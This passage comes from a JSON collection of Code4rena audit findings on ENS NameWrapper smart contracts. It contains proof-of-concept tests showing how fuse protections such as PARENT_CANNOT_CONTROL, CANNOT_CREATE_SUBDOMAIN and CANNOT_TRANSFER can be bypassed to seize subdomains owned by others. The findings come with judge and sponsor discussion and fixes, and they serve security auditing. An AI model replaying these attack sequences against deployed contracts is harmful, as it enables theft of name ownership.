vm.prank(user1);\n        registrar.setApprovalForAll(address(nameWrapper), true);\n        vm.prank(user1);\n        nameWrapper.wrapETH2LD('vitalik', user1, 0, address(0));\n        // after name wrap check\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));\n        assertEq(owner, user1);\n        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH);\n        assertEq(expiry, 2038123728);\n        // wrapETH2LD --\n\n        vm.warp(2038123729);\n        // after expiry\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(node));\n        assertEq(owner, address(0));\n        assertEq(fuses, 0);\n        assertEq(expiry, 2038123728);\n        assertEq(nameWrapper.ownerOf(uint256(node)), address(0));\n        assertEq(ens.owner(node), address(nameWrapper)); // registry.owner is not zero\n        vm.expectRevert();\n        registrar.ownerOf(uint256(node));\n    }\n```\n\nSince an expired name is technically unwrapped, even a parent with `CANNOT_CREATE_SUBDOMAIN` can set the owner or records of the subdomain as the proof of concept below shows.\n\n```solidity\n    function testM3ExpiredNameCreate() public {\n        // After expired, the ens.owner's address is non-zero\n        // therefore, the parent can 'create' the name evne CANNOT_CREATE_SUBDOMAIN is burned\n        string memory parent = 'vitalik.eth';\n        string memory sub1_full = 'sub1.vitalik.eth';\n        string memory sub1 = 'sub1';\n        (, bytes32 parent_node) = parent.dnsEncodeName();\n        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();\n\n        // wrap parent and lock\n        vm.prank(user1);\n        registrar.setApprovalForAll(address(nameWrapper), true);\n        vm.prank(user1);\n        nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));\n        // checks\n        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));\n        assertEq(owner, user1);\n        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);\n        assertEq(expiry, 2038123728);\n\n        // create subnode\n        vm.prank(user1);\n        nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, user2);\n        assertEq(fuses, PARENT_CANNOT_CONTROL);\n        assertEq(expiry, 1700000000);\n\n        // now parent cannot create subdomain\n        vm.prank(user1);\n        nameWrapper.setFuses(parent_node, uint16(CANNOT_CREATE_SUBDOMAIN));\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(parent_node));\n        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN);\n        // parent: pcc cu CANNOT_CREATE_SUBDOMAIN\n        // child: pcc\n        // unwrap and sets the owner to zero\n\n        // parent cannot use setSubnodeRecord on PCCed sub\n        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));\n        vm.prank(user1);\n        nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);\n\n        // expire sub1\n        vm.warp(1700000001);\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, address(0));\n        assertEq(fuses, 0);\n        assertEq(expiry, 1700000000);\n        assertEq(ens.owner(sub1_node), address(nameWrapper));\n\n        // user1 can re-\"create\" sub1 even though CANNOT_CREATE_SUBDOMAIN is set on parent\n        vm.prank(user1);\n        nameWrapper.setSubnodeRecord(parent_node, sub1, address(3), address(11), 10, 0, 0);\n        (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));\n        assertEq(owner, address(3));\n        assertEq(fuses, 0);\n        assertEq(expiry, 1700000000);\n        assertEq(ens.owner(sub1_node), address(nameWrapper));\n\n        // comparison: tries create a new subdomain and revert\n        string memory sub2 = 'sub2';\n        string memory sub2_full = 'sub2.vitalik.eth';\n        (, bytes32 sub2_node) = sub2_full.dnsEncodeName();\n        vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub2_node));\n        vm.prank(user1);\n        nameWrapper.setSubnodeRecord(parent_node, sub2, user2, address(11), 10, 0, 0);\n    }\n```\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nUnclear as the `NameWrapper` cannot set ENS.owner after expiration automatically.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1336600387):**\n > POC Looks valid, will ask for sponsor confirmation\n\n**[jefflau (ENS) confirmed and commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1337768838):**\n > Possible mitigation is:\n> \n> If the owner in the registry is non-zero, then check if the `ownerOf()` in NameWrapper is 0. If it is, treat it as unregistered so it is protected under `CANNOT_CREATE_SUBDOMAIN`.\n> \n> ```solidity\n>     modifier canCallSetSubnodeOwner(bytes32 node, bytes32 labelhash) {\n>         bytes32 subnode = _makeNode(node, labelhash);\n>         address owner = ens.owner(subnode);\n>         (address wrappedOwner, uint32 fuses, ) = getData(uint256(subnode));\n> \n>         if (owner == address(0) || wrappedOwner == address(0)) {\n>             if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n>                 revert OperationProhibited(subnode);\n>             }\n>         } else {\n>             (, uint32 subnodeFuses, ) = getData(uint256(subnode));\n>             if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {\n>                 revert OperationProhibited(subnode);\n>             }\n>         }\n> \n>         _;\n>     }\n> ```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1343458132):**\n > Was running into stack too deep so I created local stack (just added extra `{`)\n> \n> ```solidity\n>     modifier canCallSetSubnodeOwner(bytes32 node, bytes32 labelhash) {\n>         {\n>             bytes32 subnode = _makeNode(node, labelhash);\n>             address owner = ens.owner(subnode);\n>             (address wrappedOwner, uint32 fuses, ) = getData(uint256(subnode));\n> \n>             if (owner == address(0) || wrappedOwner == address(0)) {\n>                 if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n>                     revert OperationProhibited(subnode);\n>                 }\n>             } else {\n>                 (, uint32 subnodeFuses, ) = getData(uint256(subnode));\n>                 if (subnodeFuses & PARENT_CANNOT_CONTROL != 0) {\n>                     revert OperationProhibited(subnode);\n>                 }\n>             }\n> \n>         }\n> ```\n> \n> The modifier change makes `testM3ExpiredNameCreate` fail.\n> \n> Will defer to Wardens for further advice, but I believe mitigation to be valid.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1343459327):**\n > The warden has shown how, domains that are expired are interpreted as unwrapped instead of as unregistered.\n> \n> Given the impact, I think Medium Severity to be the most appropriate.\n\n**[zzzitron (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1345194298):**\n > I think the mitigation works to disallow the bypass of the `CANNOT_CREATE_SUBDOMAIN` fuse.\n> \n> But per the `unregistered` and `unwrapped` criteria in the docs, after expiration the domain is `unwrapped`.\n> \n> > To check if a name is Unregistered, verify that NameWrapper.ownerOf returns address(0) and so does Registry.owner.\n> > To check if a name is Unwrapped, verify that NameWrapper.ownerOf returns address(0) and Registry.owner does not.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/7#issuecomment-1376909138):**\n > Fixed.<br>\n> For all expired nodes, the CANNOT_CREATE_SUBDOMAIN flag is checked in both cases now (either ens owner or wrappedOwner is address(0) )\n> \n> ```\n> if (owner == address(0) || wrappedOwner == address(0)) {\n>                 if (fuses & CANNOT_CREATE_SUBDOMAIN != 0) {\n>                     revert OperationProhibited(subnode);\n>                 }\n>             }\n> ```\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a bug found in the NameWrapper.sol contract within the 2022-11-ens repository. The bug affects expired names in that they are supposed to be unregistered, but they behave like they are unwrapped. This means that a parent with the CANNOT_CREATE_SUBDOMAIN fuse can \"create\" again an expired name and can setSubdomainOwner before burning CANNOT_CREATE_SUBDOMAIN in order to use the subdomain later.\n\nA proof of concept was created to demonstrate this bug, which can be found in a gist linked in the report. The gist also contains instructions on how to run the test. According to the wrapper/README.md, to check if a name is Unregistered, verify that NameWrapper.ownerOf returns address(0) and so does Registry.owner. To check if a name is Unwrapped, verify that NameWrapper.ownerOf returns address(0) and Registry.owner does not.\n\nThe recommended mitigation steps are unclear, as the NameWrapper cannot set ENS.owner after expiration automatically. Alex the Entreprenerd (judge) commented that the proof of concept looks valid and asked for sponsor confirmation. Jefflau (ENS) confirmed and commented that a possible mitigation is to check if the owner in the registry is non-zero, then check if the ownerOf() in NameWrapper is 0. If it is, treat it as unregistered so it is protected under CANNOT_CREATE_SUBDOMAIN. Alex the Entreprenerd (judge) then commented that he ran into stack too deep and had to create a local stack, and that the modifier change made the testM3ExpiredNameCreate fail. He deferred to Wardens for further advice, but believed the mitigation to be valid. Zzzitron (warden) commented that the mitigation works to disallow the bypass of the CANNOT_CREATE_SUBDOMAIN fuse, but per the unregistered and unwrapped criteria in the docs, after expiration the domain is unwrapped. Csanuragjain (warden) finally fixed the bug by checking the CANNOT_CREATE_SUBDOMAIN flag in both cases (either ens owner or wrappedOwner is address(0)).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-11-ens",
      "github_link": "https://github.com/code-423n4/2022-11-ens-findings/issues/7",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "19894",
      "title": "[M-01] NameWrapper: Cannot prevent transfer while upgrade even with `CANNOT_TRANSFER` fuse regardless of the upgraded NameWrapper's implementation",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L408><br>\n<https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L436>\n\nUpon upgrade to a new `NameWrapper` contract, `owner` of the node will be set to the given `wrappedOwner`. Since the node will be `_burn`ed before calling the upgraded NameWrapper, the upgraded NameWrapper cannot check the old owner. Therefore, no matter the upgraded NameWrapper's implementation, it locks the information to check whether the old owner and newly given `wrappedOwner` are the same. If they are not the same, it means basically transferring the name to a new address.\n\nIn the case of resolver, the upgraded NameWrapper can check the old resolver by querying to the `ENS` registry, and prevent changing it if `CANNOT_SET_RESOLVER` fuse is burned.\n\n### Proof of Concept\n\nBelow is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.\n\nThe proof of concept below demonstrates upgrade process.\n\n```solidity\n// https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol-L215-L243\n    function testM2TransferWhileUpgrade() public {\n        // using the mock for upgrade contract\n        deployNameWrapperUpgrade();\n        string memory node_str = 'vitalik.eth';\n        string memory sub1_full = 'sub1.vitalik.eth';\n        string memory sub1_str = 'sub1';\n        (, bytes32 node) = node_str.dnsEncodeName();\n        (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();\n\n        // wrap parent and lock\n        vm.prank(user1);\n        registrar.setApprovalForAll(address(nameWrapper), true);\n        vm.prank(user1);\n        nameWrapper.wrapETH2LD('vitalik', user1, type(uint16).max /* all fuses are burned */, address(0));\n        // sanity check\n        (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));\n        assertEq(owner, user1);\n        assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | type(uint16).max);\n        assertEq(expiry, 2038123728);\n\n        // upgrade as nameWrapper's owner\n        vm.prank(root_owner);\n        nameWrapper.setUpgradeContract(nameWrapperUpgrade);\n        assertEq(address(nameWrapper.upgradeContract()), address(nameWrapperUpgrade));\n\n        // user1 calls upgradeETH2LD\n        vm.prank(user1);\n        nameWrapper.upgradeETH2LD('vitalik', address(123) /* new owner */, address(531) /* resolver */);\n    }\n```\n\nEven if the `CANNOT_TRANSFER` fuse is in effect, the user1 can call `upgradeETH2LD` with a new owner.\n\nBefore the `NameWrapper.upgradeETH2LD` calls the new upgraded NameWrapper `upgradeContract`, it calls `_prepareUpgrade`, which burns the node in question. It means, the current `NameWrapper.ownerOf(node)` will be zero.\n\nThe upgraded NameWrapper has only the given `wrappedOwner` which is supplied by the user, which does not guarantee to be the old owner (as the proof of concept above shows). As the ens registry and ETH registrar also do not have any information about the old owner, the upgraded NameWrapper should probably set the owner of the node to the given `wrappedOwner`, even if `CANNOT_TRANSFER` fuse is in effect.\n\nOn contrary to the owner, although `resolver` is given by the user on the `NameWrapper.upgradeETH2LD` function, it is possible to prevent changing it if the `CANNOT_SET_RESOLVER` fuse is burned, by querying to `ENSRegistry`.\n\n```solidity\n// NameWrapper\n\n 408     function upgradeETH2LD(\n 409         string calldata label,\n 410         address wrappedOwner,\n 411         address resolver\n 412     ) public {\n 413         bytes32 labelhash = keccak256(bytes(label));\n 414         bytes32 node = _makeNode(ETH_NODE, labelhash);\n 415         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);\n 416\n 417         upgradeContract.wrapETH2LD(\n 418             label,\n 419             wrappedOwner,\n 420             fuses,\n 421             expiry,\n 422             resolver\n 423         );\n 424     }\n\n 840     function _prepareUpgrade(bytes32 node)\n 841         private\n 842         returns (uint32 fuses, uint64 expiry)\n 843     {\n 844         if (address(upgradeContract) == address(0)) {\n 845             revert CannotUpgrade();\n 846         }\n 847\n 848         if (!canModifyName(node, msg.sender)) {\n 849             revert Unauthorised(node, msg.sender);\n 850         }\n 851\n 852         (, fuses, expiry) = getData(uint256(node));\n 853\n 854         _burn(uint256(node));\n 855     }\n```\n\nThe function `NameWrapper.upgrade` has the same problem.\n\n```solidity\n// NameWrapper\n 436     function upgrade(\n 437         bytes32 parentNode,\n 438         string calldata label,\n 439         address wrappedOwner,\n 440         address resolver\n 441     ) public {\n 442         bytes32 labelhash = keccak256(bytes(label));\n 443         bytes32 node = _makeNode(parentNode, labelhash);\n 444         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);\n 445         upgradeContract.setSubnodeRecord(\n 446             parentNode,\n 447             label,\n 448             wrappedOwner,\n 449             resolver,\n 450             0,\n 451             fuses,\n 452             expiry\n 453         );\n 454     }\n```\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nIf the `CANNOT_TRANSFER` fuse is set, enforce the `wrappedOwner` to be same as the `NameWrapper.ownerOf(node)`.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1336466603):**\n > From further testing, it seems like upgrading will ignore the value provided, here the changed POC\n> \n> ```solidity\n> function testM2TransferWhileUpgrade() public {\n>         // using the mock for upgrade contract\n>         deployNameWrapperUpgrade();\n>         string memory node_str = 'vitalik.eth';\n>         string memory sub1_full = 'sub1.vitalik.eth';\n>         string memory sub1_str = 'sub1';\n>         (, bytes32 node) = node_str.dnsEncodeName();\n>         (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();\n> \n>         // wrap parent and lock\n>         vm.prank(user1);\n>         registrar.setApprovalForAll(address(nameWrapper), true);\n>         vm.prank(user1);\n>         nameWrapper.wrapETH2LD('vitalik', user1, type(uint16).max /* all fuses are burned */, address(0));\n>         // sanity check\n>         (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));\n>         assertEq(owner, user1);\n>         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | type(uint16).max);\n>         assertEq(expiry, 2038123728);\n> \n>         // upgrade as nameWrapper's owner\n>         vm.prank(root_owner);\n>         nameWrapper.setUpgradeContract(nameWrapperUpgrade);\n>         assertEq(address(nameWrapper.upgradeContract()), address(nameWrapperUpgrade));\n> \n>         // user1 calls upgradeETH2LD\n>         vm.prank(user1);\n>         address newOwner = address(123);\n>         nameWrapper.upgradeETH2LD('vitalik',  newOwner , address(531) /* resolver */);\n>         address secondOwner = nameWrapper.ownerOf(uint256(node));\n>         assertEq(secondOwner, newOwner);\n>     }\n> ```\n> \n> Which reverts as the secondOwner is actually address(0)\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1336468796):**\n > Changing the last line to<br>\n> `assertEq(secondOwner, address(0));`<br>\n> Makes the test pass\n\n**[jefflau (ENS) confirmed and commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1337576844):**\n > > In the case of resolver, the upgraded NameWrapper can check the old resolver by querying to the ENS registry, and prevent changing it if CANNOT_SET_RESOLVER fuse is burned.\n> \n> For this specific case, the public resolver checks for the owner on the NameWrapper. If the NameWrapper needed to be upgraded for any reason, the old resolver would be checking the old NameWrapper, and since the owner would be burnt, they would lock all records. So for this case I think it's reasonable to allow `CANNOT_SET_RESOLVER` to be bypassed in this specific case.\n> \n> > From further testing, it seems like upgrading will ignore the value provided, here the changed POC\n> \n> I think this test is incorrect, you should be checking the new NameWrapper, not the old NameWrapper. I believe this would pass:\n> \n> ```\n> address secondOwner = nameWrapperUpgrade.ownerOf(uint256(node));\n> assertEq(secondOwner, newOwner);\n> ```\n> \n> All things consider - I think the `CANNOT_TRANSFER` restriction that the warden mentioned does make sense.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1340204138):**\n > @jefflau - Took me a while but I have to agree with you, querying ownerOf on the `nameWrapperUpgrade` will return the new owner.\n> \n> I wrote a Bodge to make it work, but would like to flag that the function `wrapETH2LD` uses different parameters, and also the size of fuses is changed (uint32 vs uint16).\n> \n> Am assuming the upgradedWrapper will have a check for the old wrapper being the caller\n> \n> The code changes I made to verify the finding: [here](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1340204138).\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1340216291):**\n > Per the discussion above, the Warden has shown how, despite burning the fuse to prevent transfers, due to the implementation of NameWrapper, a node can still be transferred during an upgrade.\n> \n> I believe that, technically this can be prevented by changing the implementation of the upgraded NameWrapper, and because it's reliant on that implementation, I agree with Medium Severity.\n> \n> Performing a check for ownership on the old wrapper, I believe, should offer sufficient mitigation.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/6#issuecomment-1376898321):**\n > Fixed.<br>\n> The owner value is now derived from getData function which retrieves the current node owner. If it does not matches the assigned owner then CANNOT_TRANSFER fuse is always checked (non expired scenario)\n> \n> ```\n> (address currentOwner, uint32 fuses, uint64 expiry) = _prepareUpgrade(\n>             node\n>         );\n> if (wrappedOwner != currentOwner) {\n>             _preTransferCheck(uint256(node), fuses, expiry);\n>         }\n> \n> // Now _preTransferCheck checks ->\n> \n> if (fuses & CANNOT_TRANSFER != 0) {\n>                 revert OperationProhibited(bytes32(id));\n>             }\n> ```\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the issue of transferring a node to a new owner during an upgrade process of a NameWrapper contract. The NameWrapper contract is used to manage the ownership of nodes in the Ethereum Name Service (ENS) registry. If the `CANNOT_TRANSFER` fuse is set, it should prevent the user from transferring the node to a new owner. However, due to the implementation of the NameWrapper contract, the user can still call the `upgradeETH2LD` or `upgrade` function with a new owner, which bypasses the `CANNOT_TRANSFER` fuse.\n\nThe proof of concept provided in the report demonstrates the upgrade process. It shows that even if the `CANNOT_TRANSFER` fuse is in effect, the user can call `upgradeETH2LD` with a new owner. Before the `NameWrapper.upgradeETH2LD` calls the new upgraded NameWrapper `upgradeContract`, it calls `_prepareUpgrade`, which burns the node in question. This means the current `NameWrapper.ownerOf(node)` will be zero. The upgraded NameWrapper has only the given `wrappedOwner` supplied by the user, which does not guarantee to be the old owner. As the ENS registry and ETH registrar also do not have any information about the old owner, the upgraded NameWrapper sets the owner of the node to the given `wrappedOwner`, even if `CANNOT_TRANSFER` fuse is in effect.\n\nThe same issue applies to the `NameWrapper.upgrade` function as well.\n\nThe recommended mitigation step is to enforce the `wrappedOwner` to be the same as the `NameWrapper.ownerOf(node)` if the `CANNOT_TRANSFER` fuse is set. After further testing and discussion, it was agreed that the `CANNOT_TRANSFER` restriction does make sense and the bug has been fixed by performing a check for ownership on the old wrapper.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-11-ens",
      "github_link": "https://github.com/code-423n4/2022-11-ens-findings/issues/6",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "19893",
      "title": "[H-02] During the deprecation period where both .eth registrar controllers are active, a crafted hack can be launched and cause the same malicious consequences of [H-01] even if [H-01] is properly fixed",
      "impact": "HIGH",
      "content": "\nSpecifically, according to the [documentation](https://github.com/ensdomains/ens-contracts/tree/master/contracts/wrapper#register-wrapped-names), there will be a deprecation period that two types of .eth registrar controllers are active.\n\n> Names can be registered as normal using the current .eth registrar controller. However, the new .eth registrar controller will be a controller on the NameWrapper, and have NameWrapper will be a controller on the .eth base registrar.\n\n> Both .eth registrar controllers will be active during a deprecation period, giving time for front-end clients to switch their code to point at the new and improved .eth registrar controller.\n\nThe current .eth registrar controller can directly register ETH2LD and send to the user, while the new one will automatically wrap the registered ETH2LD.\n\nIf the two .eth registrar controllers are both active, an ETH2LD node can be **implicitly** unwrapped while the NameWrapper owner remains to be the hacker.\n\n**Note that this hack can easily bypass the patch of \\[H-01].**\n\nConsidering the following situtation.\n\n*   the hacker registered and wrapped an ETH2LD node `sub1.eth`, with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` burnt. The ETH2LD will be expired shortly and can be re-registred within the aformentioned deprecation period.\n\n*   after `sub1.eth` is expired, the hacker uses the current .eth registrar controller to register `sub1.eth` to himself.\n    *   *at this step, the `sub1.eth` is implicitly unwrapped*.\n    *   the hacker owns the registrar ERC721 as well as the one of ENS registry for `sub1.eth`.\n    *   however, `sub1.eth` in NameWrapper remains valid.\n\n*   he sets `EnsRegistry.owner` of `sub1.eth` as NameWrapper.\n    *   note that **this is to bypass the proposed patch for \\[H-01].**\n\n*   he wraps `sub2.sub1.eth` with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` and trafers it to a victim user.\n\n*   he uses `BaseRegistrar::reclaim` to become the `EnsRegistry.owner` of `sub1.eth`\n    *   at this step, the hack can be launched as **\\[H-01]** does.\n\nFor example,\n\n*   he can first invokes `EnsRegistry::setSubnodeOwner` to become the owner of `sub2.sub1.eth`\n\n*   he then invokes `NameWrapper::wrap` to wrap `sub2.sub1.eth` to re-claim as the owner.\n\n**Note that it does not mean the impact of the above hack is limited in the deprecation period**.\n\nWhat the hacker needs to do is to re-registers `sub1.eth` via the old .eth registrar controller (in the deprecation period). He can then launch the attack any time he wants.\n\n### Proof of Concept\n\n```js\n    it('Attack happens within the deprecation period where both .eth registrar controllers are active', async () => {\n      await NameWrapper.registerAndWrapETH2LD(\n        label1,\n        hacker,\n        1 * DAY,\n        EMPTY_ADDRESS,\n        CANNOT_UNWRAP\n      )\n\n      // wait the ETH2LD expired and re-register to the hacker himself\n      await evm.advanceTime(GRACE_PERIOD + 1 * DAY + 1)\n      await evm.mine()\n\n      // XXX: note that at this step, the hackler should use the current .eth\n      // registrar to directly register `sub1.eth` to himself, without wrapping\n      // the name.\n      await BaseRegistrar.register(labelHash1, hacker, 10 * DAY)\n      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)\n      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)\n\n      // set `EnsRegistry.owner` as NameWrapper. Note that this step is used to\n      // bypass the newly-introduced checks for [H-01]\n      //\n      // XXX: corrently, `sub1.eth` becomes a normal node\n      await EnsRegistryH.setOwner(wrappedTokenId1, NameWrapper.address)\n\n      // create `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL`\n      // burnt.\n      await NameWrapperH.setSubnodeOwner(\n        wrappedTokenId1,\n        label2,\n        account2,\n        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\n        MAX_EXPIRY\n      )\n      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(account2)\n\n      // XXX: reclaim the `EnsRegistry.owner` of `sub1.eth` as the hacker\n      await BaseRegistrarH.reclaim(labelHash1, hacker)\n      expect(await EnsRegistry.owner(wrappedTokenId1)).to.equal(hacker)\n      expect(await BaseRegistrar.ownerOf(labelHash1)).to.equal(hacker)\n\n      // reset the `EnsRegistry.owner` of `sub2.sub1.eth` as the hacker\n      await EnsRegistryH.setSubnodeOwner(wrappedTokenId1, labelHash2, hacker)\n      expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\n\n      // wrap `sub2.sub1.eth` to re-claim as the owner\n      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\n      await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\n      expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\n    })\n```\n\n### Recommended Mitigation Steps\n\nMay need to discuss with ENS team. A naive patch is to check whther a given ETH2LD node is indeed wrapped every time we operate it. However, it is not gas-friendly.\n\n**[jefflau (ENS) confirmed](https://github.com/code-423n4/2022-11-ens-findings/issues/16)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/16#issuecomment-1343480679):**\n > The Warden has shown how, because of the migration period, with two controller registrar being active at the same time, a malicious attacker could claim sub-nodes that belong to other people.\n> \n> In contrast to an external requirement that is vague, the Sponsor has made it clear that a similar setup will happen in reality, and because of the impact, I agree with a High Severity.\n> \n> It may be worth exploring a \"Migration Registry\", which maps out which name was migrated, while allowing migration to move only in one way.\n\n**[izhuer (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/16#issuecomment-1343708426):**\n > The corresponding [patch](https://github.com/ensdomains/ens-contracts/pull/162) looks valid. \n> \n> I was trying to find a more gas-efficient (w/o tricky code) mitigation patch but did not get lucky yet. I will let Sponsor know here if I figure it out.\n\n**[csanuragjain (warden) commented](https://github.com/code-423n4/2022-11-ens-findings/issues/16#issuecomment-1376925886):**\n > Looks good to me.<br>\n> For expired node, if registrar owner is not NameWrapper then owner is nullified and becomes address(0)\n> \n> ```\n> if(\n> registrarExpiry > block.timestamp &&\n>                 registrar.ownerOf(uint256(labelHash)) != address(this)\n>             ) {\n>                 owner = address(0);\n>             }\n> ```\n\n\n\n***\n \n",
      "summary": "\nA bug report has been released that describes a vulnerability in the .eth registrar controllers. According to the documentation, two types of .eth registrar controllers should be active during a deprecation period, allowing for front-end clients to switch their code to point at the new and improved .eth registrar controller. The issue is that if both .eth registrar controllers are active, an ETH2LD node can be implicitly unwrapped while the NameWrapper owner remains to be the hacker. This can easily bypass the patch of [H-01]. \n\nThe bug report outlines a proof of concept where the hacker registers and wraps an ETH2LD node `sub1.eth`, with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP` burnt. After `sub1.eth` is expired, the hacker uses the current .eth registrar controller to register `sub1.eth` to himself, which implicitly unwraps the node. The hacker then sets `EnsRegistry.owner` of `sub1.eth` as NameWrapper, and creates `sub2.sub1.eth` to the victim user with `PARENT_CANNOT_CONTROL | CANNOT_UNWRAP`. Finally, the hacker uses `BaseRegistrar::reclaim` to become the `EnsRegistry.owner` of `sub1.eth` and launch the attack. \n\nThe bug report also provides a recommended mitigation step. It suggests that a check should be in place to ensure that a given ETH2LD node is indeed wrapped every time it is operated. However, this may not be gas-friendly. Jefflau (ENS) confirmed the issue and Alex the Entreprenerd (judge) commented that the Warden had shown how the malicious attack could take place due to the migration period. Izhuer (warden) commented that the corresponding patch looks valid, and Csanuragjain (warden) also commented that the patch looks good. \n\nThe bug report concluded by noting that the impact of the hack is not limited to the deprecation period, as the hacker only needs to re-register `sub1.eth` via the old .eth registrar controller (in the deprecation period) to launch the attack any time they want.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-11-ens",
      "github_link": "https://github.com/code-423n4/2022-11-ens-findings/issues/16",
      "tags": [],
      "finders": [
        "izhuer"
      ]
    },
    {
      "id": "19892",
      "title": "[H-01] `PARENT_CANNOT_CONTROL` and `CANNOT_CREATE_SUBDOMAIN` fuses can be bypassed",
      "impact": "HIGH",
      "content": "\nThe fuse constraints can be violated by a malicious owner of the parent node (i.e., the hacker). There are two specific consequences the hacker can cause.\n\n*   Suppose the subnode has been assigned to a victim user, the hacker can re-claim him as the owner of the subnode even if the `PARENT_CANNOT_CONTROL` of the subnode has been burnt.\n*   Suppose the owner of the subnode remains to be the hacker, he can create sub-subnode even if the `CANNOT_CREATE_SUBDOMAIN` of the subnode has been burnt.\n\nBasically, ENS NameWrapper uses the following rules to prevent all previous C4 hacks (note that I will assume the audience has some background regarding the ENS codebase).\n\n*   The `PARENT_CANNOT_CONTROL` fuse of a subnode can be burnt if and only if the `CANNOT_UNWRAP` fuse of its parent has already been burnt.\n*   The `CANNOT_UNWRAP` fuse of a subnode can be burnt if and only if its `PARENT_CANNOT_CONTROL` fuse has already been burnt.\n\nHowever, such guarantees would only get effective when the `CANNOT_UNWRAP` fuse of the subject node is burnt.\n\nConsidering the following scenario.\n\n1.  `sub1.eth` (the ETH2LD node) is registered and wrapped to the hacker - *the ENS registry owner, i.e., `ens.owner`, of `sub1.eth` is the NameWrapper contract.*\n\n2.  `sub2.sub1.eth` is created with no fuses burnt, where the wrapper owner is still the 